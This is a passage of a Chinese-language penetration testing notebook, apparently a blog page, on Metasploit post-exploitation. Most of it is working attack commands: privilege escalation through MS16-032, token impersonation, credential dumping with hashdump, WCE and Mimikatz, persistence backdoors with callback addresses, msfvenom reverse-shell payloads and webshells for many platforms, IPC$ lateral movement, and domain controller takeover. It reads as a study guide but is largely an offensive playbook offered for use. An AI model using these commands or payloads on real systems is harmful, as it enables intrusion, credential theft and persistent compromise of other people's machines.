class="comment">########## 文件系统命令</span></span><br><span class="line"><span class="built_in">pwd</span>	/   getwd  <span class="comment"># 查看目标机器当前目录 </span></span><br><span class="line">getlwd    <span class="comment"># 查看本机当前目录 </span></span><br><span class="line"><span class="built_in">cd</span>	<span class="comment"># 切换目录(注意\的转义)</span></span><br><span class="line">ls	<span class="comment"># 查看当前目录内容</span></span><br><span class="line">search	-f *.txt	  -d c: <span class="comment"># 搜索文件（search -h 查看帮助） -d指定目录， -f搜索模式</span></span><br><span class="line">upload	/var/www/test.txt c:\  <span class="comment"># 上传文件到目标机器的路径</span></span><br><span class="line">download	 c:\test.txt  <span class="comment"># 下载文件(默认保存到msf的目录)</span></span><br><span class="line">cat	<span class="comment"># 查看文件内容</span></span><br><span class="line">edit <span class="comment"># 编辑文件</span></span><br><span class="line">execute	-f c:\\windows\\system32\\calc.exe  <span class="comment"># 执行文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">run keylogrecorder   .... <span class="comment"># 键盘记录？</span></span><br></pre></td></tr></table></figure></p>
+<h6 id="后渗透攻击：提权"><a href="#后渗透攻击：提权" class="headerlink" title="后渗透攻击：提权"></a>后渗透攻击：提权</h6><ul>
+<li>纵向提权</li>
+<li>横向提权</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取Meterpreter Shell之后，查看我们是什么权限</span></span><br><span class="line"><span class="comment"># Meterpreter 下输入</span></span><br><span class="line">shell    <span class="comment"># 进入目标的cmd</span></span><br><span class="line">whoami /groups  <span class="comment"># 查看当前权限</span></span><br><span class="line"><span class="comment">## 下面就开始进行提权了</span></span><br><span class="line"><span class="comment"># 用本地溢出漏洞，利用现成的exploit</span></span><br></pre></td></tr></table></figure>
+<p><strong>1.利用WMIC实战MS16-032本地溢出漏洞</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># WMIC是win一个命令行工具(交互模式/非交互模式)，不仅可管理本机还可管理域内所有远程主机(前提是有权限)，而被管理者不需要安装WMIC</span></span><br><span class="line"><span class="comment"># WMIC在信息搜集和后渗透十分有用，可以调查目标机的进程，服务，用户，用户组，网络连接，硬盘信息，时区，操作系统信息等</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设拿到了Meterpreter shell</span></span><br><span class="line">getuid</span><br><span class="line">getsystem    <span class="comment"># 尝试提权，但是失败</span></span><br><span class="line"><span class="comment"># 接着查看系统打了的补丁(传统方法：在目标cmd输入systeminfo，或查询C:\windows\补丁号.log)</span></span><br><span class="line"><span class="comment"># 这里利用WMIC命令列出安装的补丁</span></span><br><span class="line">WMIC qfe get Caption,Description,HotFixID,IntalledOn</span><br><span class="line"><span class="comment"># 找到打的补丁后，去找exp(然后将系统安装的补丁编号与提权exp编号比对，然后使用没有编号的exp进行提权)</span></span><br><span class="line"><span class="comment">## 漏洞信息网站： 安全焦点， Expolit-DB</span></span><br><span class="line"><span class="comment"># 接下来准备提权(把Meterpreter放到后台：background), 然后搜索ms16-032</span></span><br><span class="line">search ms16-032    <span class="comment"># 如果找不到，可以试试升级：msfupdate  或者手动添加相应漏洞EXP</span></span><br><span class="line">use exploit/windows/<span class="built_in">local</span>/ms16_032_secondary_logon_handle_privsec</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">run</span><br><span class="line"><span class="comment"># 会返回一个新的session，进入，执行getuid 反省是system权限了</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>2.令牌窃取</strong><br>令牌(Token)就是系统的<code>临时密钥</code>, 相当与账户密码，特点是随机性和不可预测<br>在假冒令牌攻击中需要使用<code>Kerberos</code>协议(一种网络认证协议，其设计目的是通过密钥系统为客户机/服务器应用程序提供强大的认证服务)<br>Kerberos工作机制：<br>xxx待补充</p>
+<p>假冒令牌实战利用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设已经拿到了Meterpreter shell</span></span><br><span class="line">getuid</span><br><span class="line">getsystem <span class="comment"># 提权失败</span></span><br><span class="line"></span><br><span class="line">use incognito</span><br><span class="line">list token -u <span class="comment"># 列出可用的token(会看到结果，根据Meterpreter shell的权限而定)</span></span><br><span class="line"><span class="comment"># 假设从输出信息中看到了目标机器的..., 继续在incognito中执行</span></span><br><span class="line">impersonate_token WIN7-TEST\\Administrator <span class="comment"># 调用incognito中的这个impersonate_token 命令，来假冒Admin进行攻击(注意是两个反斜杠)</span></span><br><span class="line">shell</span><br><span class="line">whoami  <span class="comment"># 查看权限</span></span><br></pre></td></tr></table></figure></p>
+<p>Hash攻击<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###### 1.是使用Hashdump抓取密码</span></span><br><span class="line">hashdump   <span class="comment"># 导出主机的sam数据库的hash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 另一个更强大的模块</span></span><br><span class="line">run winsows/gather/smart_hashdump  <span class="comment"># 若是win7,且开启了uac，就要使用绕过uac的模块再继续</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##### 2.使用Quarks PwDump抓取密码</span></span><br><span class="line">win32下的一款工具，导出信息十分全面，支持系统版本十分广泛</span><br><span class="line">具体参数再查</span><br><span class="line">QuarksPwDump.exe -dh1 -o 1.txt</span><br><span class="line"><span class="comment"># 还可配合在 Ntdsutil 工具到处DC的密码</span></span><br><span class="line"></span><br><span class="line">ps: win的密码会加密存放在/windows/system32/config/sam</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##### 3.使用Windows Credentials Editor抓取密码</span></span><br><span class="line">WCE(Windows Credentials Editor)  功能强大，不过必须是管理员权限，还要主要免杀</span><br><span class="line"><span class="comment"># 先上传wce到目标</span></span><br><span class="line">upload wce.exe</span><br><span class="line"><span class="comment"># 在目标的shell下执行</span></span><br><span class="line">wce -w  <span class="comment"># 便会成功提取明文管理员密码(默认是-l命令读取，-f强制安全方式读取，-g用来计算密码，-c制定会话来执行cmd，-v显示详细信息，-w最关键 --&gt; 查看已登录的明文密码)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##### 4.使用Mimikatz抓取密码</span></span><br><span class="line">msf内置了Mimikatz成为一个peterpreter脚本集成</span><br><span class="line">load Mimikatz</span><br><span class="line"><span class="built_in">help</span> Mimikatz</span><br><span class="line"><span class="comment"># mimikatz_command # 可以让我们使用Mimikatz全部功能, 如(:: 请求某个模块可用的选项)</span></span><br><span class="line">mimikatz_command -f <span class="built_in">hash</span>::</span><br><span class="line">mcv    <span class="comment"># 抓取系统hash值</span></span><br><span class="line">kerberos    <span class="comment"># 抓取系统票据</span></span><br><span class="line">wdigest   <span class="comment"># 获取系统账户信息</span></span><br><span class="line">mimikatz_command -f samdump::<span class="built_in">hash</span>  <span class="comment"># 抓取hash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## mimikatz 除了抓取hash，还有其他功能：比如 Handle模块，list\kill进程，模拟用户令牌等</span></span><br><span class="line">mimikatz_command -f handle::</span><br><span class="line">mimikatz_command -f service::  <span class="comment"># servvice模块可以对win的服务进行...</span></span><br><span class="line">mimikatz_command -f crypto::  <span class="comment"># crypto可以列出 导出任何证书，以及存储在目标机器上的相应的私钥</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mimikatz 也支持PowerShell调用</span></span><br><span class="line">脚本P228</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">能在PowerShell中执行mimikatz，偷窃和注入凭证，伪造Kerbero票证创建，还有其他很多功能</span><br></pre></td></tr></table></figure></p>
+<h6 id="后渗透攻击：移植漏洞利用代码模块"><a href="#后渗透攻击：移植漏洞利用代码模块" class="headerlink" title="后渗透攻击：移植漏洞利用代码模块"></a>后渗透攻击：移植漏洞利用代码模块</h6><p>支持不同语言编写的模块移植进去，允许开发者开发自己的漏洞利用模块</p>
+<p>MS17-010 –&gt; 微软SMB远程代码执行漏洞</p>
+<p>演示：移植MS17-010漏洞利用代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MS17-010 在msf中虽然有集成脚本，但是不适用于03系统，从网上自行下载</span></span><br><span class="line"><span class="comment"># clone脚本到本地，把rb脚本复制到/usr/share/metasploit-framework/modules/exploits/windows/smb下</span></span><br><span class="line">raload all  <span class="comment"># 然后在msf中重新加载脚本</span></span><br><span class="line">之后就能search到了，用use加载它</span><br><span class="line"><span class="comment"># 开始</span></span><br><span class="line">msfovenom 生成一个DLL文件(在下面<span class="built_in">set</span> payload)</span><br><span class="line">然后设置该模块的参数</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
+<h6 id="后渗透攻击：后门"><a href="#后渗透攻击：后门" class="headerlink" title="后渗透攻击：后门"></a>后渗透攻击：后门</h6><p>提取完成之后，就需要留后门了  </p>
+<p>1.操作系统后门<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##### 1.Cymothoa后门</span></span><br><span class="line">可以将ShellCode注入到现有进程的后门工具</span><br><span class="line">该后门能与被注入进程共存，且如果不检查内存是发现不了的</span><br><span class="line">该后门注入系统的某一进程，返回的是该进程相应的权限(并不需要root)， 但是关闭进程或重启，后门就会停止运行</span><br><span class="line"></span><br><span class="line">ps -aux  <span class="comment"># 查看程序的pid， Win下是 tasklist</span></span><br><span class="line"><span class="comment"># -p指定目标进程的PID，-y指定payload服务端口，-s指定ShellCode编号(cymothoa -S 查看) </span></span><br><span class="line">cymothoa -p 862 -s 1 -y 5555</span><br><span class="line"><span class="comment"># 连接后门</span></span><br><span class="line">nc -nvv 192.168.0.112 5555</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##### 2.Persistence后门</span></span><br><span class="line">使用安装自启动方式的持续型后门，可以用它创建注册表和文件</span><br><span class="line">run persistence -h  <span class="comment"># 查看命令选项</span></span><br><span class="line"><span class="comment"># 创建持久型后门</span></span><br><span class="line">run persistence -A -S -U -i 60 -p 4321 -r 162.168.0.112 </span><br><span class="line"><span class="comment"># -A自动启动payload，-S系统启动时自动加载，-U用户登录时自动启动， -X开机时自动加载，-i回连时间间隔，-P监听端口号， -r 目标机器地址</span></span><br><span class="line"></span><br><span class="line">sessions  <span class="comment"># 发现会话已成功获取</span></span><br></pre></td></tr></table></figure></p>
+<p>2.Web后门(WebShell)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 中国菜刀，AntSword， Cknife， 冰蝎，Weevely(kali使用最多，但是只支持php)，msf也有自带的后门</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##### 1. Meterpreter 后门</span></span><br><span class="line">msf中有一个叫 php meterpreter 的payload，里哟你他可以创建具有Meterpreter功能的php webshell</span><br><span class="line"><span class="comment"># 使用msfvenom创建一个webshell</span></span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=1234 -f raw &gt; p.php</span><br><span class="line"><span class="comment"># 上传webshell到目标机器</span></span><br><span class="line"><span class="comment"># 本机运行 msf multi-handler 开始监听</span></span><br><span class="line">use exploit/multi/handlers</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">...</span><br><span class="line">run</span><br><span class="line"><span class="comment"># 访问webshell页面</span></span><br><span class="line"><span class="comment"># 获得反弹的 Metasploit Shell</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##### 2. Aspx Meterpreter 后门</span></span><br><span class="line">msf下的 shell_reverse_tcp 的payload，可以创建多个版本的具有meterpreter功能的Shellcode</span><br><span class="line">这里以aspx为例, 步骤和上面的那个大致相同</span><br><span class="line">show payloads</span><br><span class="line">use windows/shell_reverse_tcp</span><br><span class="line"><span class="built_in">set</span> ...</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">generate -h  <span class="comment"># 查看帮助</span></span><br><span class="line">generate -t aspx  <span class="comment"># 生成aspx版本的ShellCode</span></span><br><span class="line"><span class="comment"># 保存内容到x.aspx，上传到服务器</span></span><br><span class="line"><span class="comment"># 本地设置监听</span></span><br><span class="line">use exploit/multi/handlers</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">...</span><br><span class="line">run</span><br><span class="line"><span class="comment"># 访问webshell页面</span></span><br><span class="line"><span class="comment"># 获得反弹的 Metasploit Shell</span></span><br><span class="line">后续就可以进行提权等操作了</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h4 id="msf基础命令"><a href="#msf基础命令" class="headerlink" title="msf基础命令"></a>msf基础命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">search ms17  <span class="comment"># 查找</span></span><br><span class="line">use exploit/multi/handler    <span class="comment"># 使用</span></span><br><span class="line">info    <span class="comment"># 查看信息</span></span><br><span class="line">show expoits/payloads/options    <span class="comment"># 显示可用信息</span></span><br><span class="line">exploit /run    <span class="comment"># 执行</span></span><br><span class="line">back    <span class="comment"># 返回上一级</span></span><br><span class="line">exploit -j     <span class="comment"># 后台运行</span></span><br><span class="line">sessions    <span class="comment"># 查看当前可用会话</span></span><br><span class="line">session -i 1  <span class="comment"># 连接某个会话</span></span><br><span class="line">sessions -K    <span class="comment"># 杀死所有活跃会话</span></span><br></pre></td></tr></table></figure>
+<h4 id="Meterpreter命令："><a href="#Meterpreter命令：" class="headerlink" title="Meterpreter命令："></a>Meterpreter命令：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">getuid    <span class="comment"># 查看用户名，从而查看当前会话具有的权限</span></span><br><span class="line">sysinfo    <span class="comment"># 列出主机信息</span></span><br><span class="line">getprivs    <span class="comment"># 尽可能多地获取目标主机上的特权</span></span><br><span class="line">getystem    <span class="comment"># 通过各种攻击向量来提升到系统用户权限</span></span><br><span class="line">hashdump    <span class="comment"># 导出目标主机中的口令哈希值</span></span><br><span class="line">screenshot    <span class="comment"># 屏幕截图</span></span><br><span class="line">background    <span class="comment"># 将当前的meterpreter shell转为后台执行</span></span><br><span class="line">quit    <span class="comment"># 关闭当前meterpreter会话，回到msf终端</span></span><br><span class="line"></span><br><span class="line">ps    <span class="comment"># 显示所有运行进程</span></span><br><span class="line">migrate PID    <span class="comment"># 迁移到制定的进程PID</span></span><br><span class="line">execute -f cmd.exe -i  <span class="comment"># 执行cmd.exe命令并进行交互</span></span><br><span class="line">shell    <span class="comment"># 以所有可用令牌来进行一个交互的shell</span></span><br></pre></td></tr></table></figure>
+<h4 id="msfvenom基础"><a href="#msfvenom基础" class="headerlink" title="msfvenom基础"></a>msfvenom基础</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考：msf下的各种生成payload命令  http://www.cnblogs.com/backlion/p/6000544.html</span></span><br><span class="line"><span class="comment">### 二进制</span></span><br><span class="line"><span class="comment"># Linux</span></span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows 生成exe程序</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.105 lport=4444 -f exe -o /var/www/html/payload.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mac</span></span><br><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### Web Payloads</span></span><br><span class="line"><span class="comment"># PHP</span></span><br><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; <span class="built_in">echo</span> <span class="string">'&lt;?php '</span> | tr -d <span class="string">'\n'</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># ASP</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br><span class="line"></span><br><span class="line"><span class="comment"># JSP</span></span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br><span class="line"></span><br><span class="line"><span class="comment"># WAR</span></span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### Scripting Payloads</span></span><br><span class="line"><span class="comment"># Python</span></span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bash</span></span><br><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Perl</span></span><br><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### Shellcode:</span></span><br><span class="line"><span class="comment"># Linux Based Shellcode</span></span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows Based Shellcode</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mac Based Shellcode</span></span><br><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### Handler</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD &lt;Payload name&gt;</span><br><span class="line"><span class="built_in">set</span> LHOST &lt;LHOST value&gt;</span><br><span class="line"><span class="built_in">set</span> LPORT &lt;LPORT value&gt;</span><br><span class="line"><span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>
+<h4 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### 第一种(这个监听更综合一点)： use exploit/multi/hander</span></span><br><span class="line"><span class="comment"># 1.msfvenom生成程序</span></span><br><span class="line"><span class="comment"># 2.使用handler执行exp</span></span><br><span class="line"><span class="comment"># 3.在目标机器运行msfvenom生成程序</span></span><br><span class="line"><span class="comment"># 4.返回session</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 第二种： use exploit/multi/script/web_delivery</span></span><br><span class="line"><span class="comment"># 1.使用web_delivery返回脚本执行并加载exp</span></span><br><span class="line"><span class="comment"># 2.在目标机器运行脚本</span></span><br><span class="line"><span class="comment"># 3.返回session</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">Note:</span> 这里要使用的payload与上面使用生成器生成的名字要一致</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="一些小思路"><a href="#一些小思路" class="headerlink" title="一些小思路"></a>一些小思路</h2><h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>当拿下第一天内网主机的权限(提权不了时)，就要以此服务器为跳板攻击其他服务器</p>
+<p>先进行网络/用户组/DC等的收集</p>
+<h6 id="获取另外一台服务器权限"><a href="#获取另外一台服务器权限" class="headerlink" title="获取另外一台服务器权限"></a>获取另外一台服务器权限</h6><p><strong>若权限不够导致不能直接攻击域服务器</strong></p>
+<ul>
+<li>使用meterpreter当前拥有的权限添加到内网路由，进行弱口令扫描</li>
+<li>用Powershell对内网进行扫描</li>
+<li>架设Socks4a, 然后socks会自动进行内网扫描</li>
+<li>利用当前权限进行内网IPC$渗透</li>
+<li>其他</li>
+</ul>
+<p>通过分析，我们输入<code>net view</code>, 发现列举的机器选择一个和我们机器名相似的服务器试，成功率一般很高<code>net use \\WIN7_TEST2\c$</code></p>
+<p>使用经典的<code>IPC$入侵</code>（通过win默认启动的ipc共享来获得计算机控制权）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">net use \192.168.0.112\ipc$   <span class="comment"># 连接这个ip的ipc共享</span></span><br><span class="line">copy srv.exe \192.168.0.112\ipc$  <span class="comment"># 复制srv(免杀的payload)到目标</span></span><br><span class="line">net time \192.168.0.112  <span class="comment"># 查看时间</span></span><br><span class="line">at \192.168.0.112 18:18 srv.exe    <span class="comment"># 用at命令在18点18分启动srv.exe (这里设置的时间要比主机时间快)</span></span><br><span class="line"><span class="comment"># 如果没有 at命令，试试新的计划任务命令： schtask </span></span><br><span class="line"><span class="comment"># 回到msf的handler进行监听，到时间会反弹shell</span></span><br><span class="line">然后进入这个新的主机，查看包括权限在内的信息, 也可以mimikatz抓密码: run /post/windows/gather/mimikatz</span><br><span class="line">也可以上传对应位数的mimikatz到该主机 upload /home/x64.exe c:\</span><br><span class="line">shell    <span class="comment"># 进入到目标的shell，再执行</span></span><br></pre></td></tr></table></figure></p>
+<h4 id="Powershell寻找域管在线服务器"><a href="#Powershell寻找域管在线服务器" class="headerlink" title="Powershell寻找域管在线服务器"></a>Powershell寻找域管在线服务器</h4><p>使用<code>PowerView</code>脚本的<code>Invoke-User Hunter</code>上传到目标机器，然后执行<code>Invoke-UserHunter</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -<span class="built_in">exec</span> bypass -Command <span class="string">"&amp;&#123;Import-Module .powerview.ps1;Invoke-UserHunter&#125;"</span></span><br></pre></td></tr></table></figure></p>
+<p>找到域管理员当前在线登录的主机后，入侵该主机，然后把它迁移到域管理员登录所在的进程，这样就有了域管的理的权限</p>
+<h4 id="获取域管权限"><a href="#获取域管权限" class="headerlink" title="获取域管权限"></a>获取域管权限</h4><p>渗透域控<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先尝试</span></span><br><span class="line">getsystem</span><br><span class="line">getuid  <span class="comment">#查看当前用户，因为之前知道这账户的域管理员</span></span><br><span class="line">ps    <span class="comment"># 找到域管理所在进程</span></span><br><span class="line">migrate 30560 <span class="comment"># 迁移进程过去(也可以用msf中窃取令牌的功能)</span></span><br><span class="line"><span class="comment"># 查看主域控的IP</span></span><br><span class="line">shell    <span class="comment"># 先进去cmd</span></span><br><span class="line">net time</span><br><span class="line"><span class="comment"># 使用IPC$入侵来返回一个域控的meterpreter shell(操作见上面的步骤)</span></span><br><span 